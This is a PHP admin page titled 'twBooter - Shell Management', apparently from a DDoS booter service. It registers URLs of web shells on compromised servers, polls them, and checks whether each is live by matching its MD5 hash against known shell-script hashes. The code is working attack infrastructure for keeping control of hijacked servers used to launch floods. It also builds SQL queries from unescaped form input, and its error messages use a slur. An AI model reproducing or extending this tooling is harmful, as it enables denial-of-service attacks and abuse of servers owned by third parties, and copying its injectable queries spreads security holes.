<?php

		//Start session
	session_start();
	//Check whether the session variable
	//SESS_MEMBER_ID is present or not
	include('includes/db.php');
	if(!isset($_SESSION['SESS_MEMBER_ID']) || (trim($_SESSION['SESS_MEMBER_ID'])=='')) {
		header("location: index.php");
		exit();
}
$query = "SELECT * FROM users WHERE id={$_SESSION['SESS_MEMBER_ID']}";
$result = mysql_query($query);
$row = mysql_fetch_array($result, MYSQL_ASSOC);

$staff = $row['staff'];
	
if ($staff !== 'admin'){
exit();
}
set_time_limit(0);
ini_set('default_socket_timeout', 20); 

if(isset($_POST['delete'])){

//print_r($_POST);

$checkbox=$_POST['checkbox'];

//exit;

for($i=0;$i<count($checkbox);$i++){

$del_id = $checkbox[$i];

$sql = "DELETE FROM shells WHERE id='$del_id'";

$result = mysql_query($sql);

}
echo 'Selected shells have been removed.';
}

if(isset($_POST['url']))
{
$theurl = trim($_POST['url']);
	$parseURL = parse_url($theurl);
	$host = gethostbyname($parseURL['host']);
	$contents = file_get_contents($theurl);
	$md5file = md5($contents);
	$timenow = time();
	
		$sql = "SELECT id FROM shells WHERE host='".mysql_real_escape_string($host)."'";
	$query = mysql_query($sql) or die(mysql_error());
	$count = mysql_num_rows($query);
	 
	if (!$contents) { echo 'Nope, check your link. Theres an error.';
	}else if($count >= "1"){
	echo "This server is already in the database";
	}else if (($md5file == '96a0cec80eb773687ca28840ecc67ca1')
	OR ($md5file == '04b639f439613ead7c21370c32630cda')
	OR ($md5file == 'cc7819055cde3194bb3b136bad5cf58d')
	OR ($md5file == 'f5d3611d722ac0a3c44ef85cc071e470')
	OR ($md5file == 'c836973a6a8cd32f27bdd08893830edd')
	OR ($md5file == 'd41d8cd98f00b204e9800998ecf8427e')){
			$sql_insert="INSERT INTO shells (url, status, hash, host, lastchecked)VALUES ('$theurl', 'up', '$md5file', '$host', '$timenow')";
			mysql_query($sql_insert);
				} else { echo 'Incorrect file'; }
	
	}

	
	if(isset($_POST['status'])){
$timenow = time();
$checkbox=$_POST['checkbox'];
mysql_query("UPDATE stats SET lastshell='$timenow' WHERE id='1'") or die("MYSQL is indeed gay: ".mysql_error());

for($i=0;$i<count($checkbox);$i++){

$check_id = $checkbox[$i];

	$query="SELECT * FROM shells WHERE id='$check_id'";

$execquery=mysql_query($query);

while($row=mysql_fetch_array($execquery, MYSQL_ASSOC)){

$parseURL = parse_url($row['url']);
$host = gethostbyname($parseURL['host']);
$hashfiled = @file_get_contents($row['url']);
$hash = md5($hashfiled);
$url = $row['url'];
$timenow = time();

mysql_query("UPDATE shells SET host='" . $host . "' WHERE url='" . $url . "'") or die ("MYSQL is indeed gay: ".mysql_error());
mysql_query("UPDATE shells SET hash='" . $hash . "' WHERE url='" . $url . "'") or die("MYSQL is indeed gay: ".mysql_error());
	
		if (!$hashfiled) { $status = '404';
		}else if (($hash == '96a0cec80eb773687ca28840ecc67ca1')
		OR ($hash == '04b639f439613ead7c21370c32630cda')
		OR ($hash == 'cc7819055cde3194bb3b136bad5cf58d')
		OR ($hash == 'f5d3611d722ac0a3c44ef85cc071e470')
		OR ($hash == 'c836973a6a8cd32f27bdd08893830edd')
		OR ($hash == 'd41d8cd98f00b204e9800998ecf8427e')){
			$status = 'up';
			}else{
			$status = 'down';
			}
mysql_query("UPDATE shells SET status='" . $status . "' WHERE url='" . $url . "'") or die("MYSQL is indeed gay: ".mysql_error());
mysql_query("UPDATE shells SET lastchecked='$timenow' WHERE url='" . $url . "'") or die("MYSQL is indeed gay: ".mysql_error());
}
}
}


?>





<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html>

<head>

<title> twBooter - Shell Management </title>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=ISO-8859-1">

<script>

function selectAllCheckBoxes(FormName, FieldName, CheckValue)

{

	if(!document.forms[FormName])

		return;

	var objCheckBoxes = document.forms[FormName].elements[FieldName];

	if(!objCheckBoxes)

		return;

	var countCheckBoxes = objCheckBoxes.length;

	if(!countCheckBoxes)

		objCheckBoxes.checked = CheckValue;

	else

		// set the check value for all check boxes

		for(var i = 0; i < countCheckBoxes; i++)

			objCheckBoxes[i].checked = CheckValue;

}

</script>

</head>
<?php include("_top.php"); ?>
<form name="frmcontadd" action="" method="post">
<table width="50%" align="center" class="table">
  <tr>
    <td colspan="2" align="center" valign="middle" class="head"><div align="left"><strong>Add New:</strong></div></td>
  </tr>
  <tr>
    <td width="10%" class="cell" align="right" valign="middle"><strong>URL</strong></td>
    <td width="40%" class="cell" valign="middle" align="center"><input class="entryfield" name="url" type="text" id="url"></td>
  </tr>
  <tr>
    <td align="right" class="cell" valign="middle">&nbsp;</td>
    <td valign="middle" class="cell" align="right"><input class="button" type="submit" name="Submit" value="Submit"></td>
  </tr>
</table></form>
<p><br>
  
  </p>
<p><br>
  <br>
    
</p>
<div align="center">
  <form name="form1" method="post" action="">

  <table width="73%" class="table">

    <tr>

      <td class="head" width="10"><div align="center"><strong>Select</strong></div></td>
      <td class="head" width="100"><div align="center"><strong>URL</strong></div></td>
	  <td class="head" width="70"><div align="center"><strong>Hash</strong></div></td>
	  <td class="head" width="40"><div align="center"><strong>Host</strong></div></td>
	  <td class="head" width="10"><div align="center"><strong>Status</strong></div></td>
	  <td class="head" width="125"><div align="center"><strong>Last Checked</strong></div></td>

      </tr>

    <?php
$cquery1="SELECT * FROM shells WHERE status='up'";
$cresult1=mysql_query($cquery1);

$query="SELECT * FROM shells";
$result=mysql_query($query);

while($row=mysql_fetch_array($result, MYSQL_ASSOC)){
?>

    <tr>

      <td class="cell"><div align="center">

        <input name="checkbox[]" type="checkbox" id="checkbox[]" value="<? echo $row['id']; ?>">

      </div></td>

      <td class="cell"><? echo $row['url'];?></td>
	  <td class="cell"><? echo $row['hash'];?></td>
	  <td class="cell"><? echo $row['host'];?></td>
	  <td class="cell"><align=center><? if ($row['status'] == 'up') { echo '<font color=\'green\'><strong>' . $row['status'] . '</strong></font>'; }else{ echo '<font color=\'red\'><strong>' . $row['status'] . '</font></strong>'; }?></align></td>
	  <td class="cell"><? echo date('d M Y H:i:s', $row['lastchecked']);?></td>
	  
      </tr>

	<?

	}

	?>

    <tr>

      <td class="cell">&nbsp;</td>

      <td class="cell" colspan="6">

        <div align="left">

  <input class="button" name="delete" type="submit" id="delete" value="Delete">

&nbsp;&nbsp;

  <input type="button" class="button" onclick="selectAllCheckBoxes('form1', 'checkbox[]', true);" value="Select All">

&nbsp;&nbsp;

  <input type="button" class="button" onclick="selectAllCheckBoxes('form1', 'checkbox[]', false);" value="Clear All">
  
&nbsp;&nbsp;

  <input class="button" name="status" type="submit" id="status" onclick="loadbar()" value="Update Status">
   
          </div></td>

    </tr>

  </table>
  </form>

</div>



  <tr><td height="14" colspan="6" class="cell">&nbsp;</td>

  </tr>
  

</body>

</html>




